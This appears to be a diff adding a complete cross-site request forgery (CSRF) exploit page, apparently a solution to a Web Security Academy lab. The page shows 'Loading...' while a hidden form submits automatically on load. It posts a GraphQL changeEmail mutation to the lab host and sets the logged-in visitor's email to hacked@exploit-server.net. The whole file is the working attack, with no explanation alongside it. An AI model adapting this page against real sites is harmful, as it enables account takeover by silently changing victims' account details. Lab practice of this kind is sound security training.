@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <form id="csrf-form" method="POST" action="https://0a29008704344731e11391ef00890034.web-security-academy.net/graphql/v1" enctype="application/x-www-form-urlencoded">
+        <input type="hidden" name="query" value="mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }" />
+        <input type="hidden" name="operationName" value="changeEmail" />
+        <input type="hidden" name="variables" value="{&quot;input&quot;:{&quot;email&quot;:&quot;hacked@exploit-server.net&quot;}}" />
+    </form>
+    <script>
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
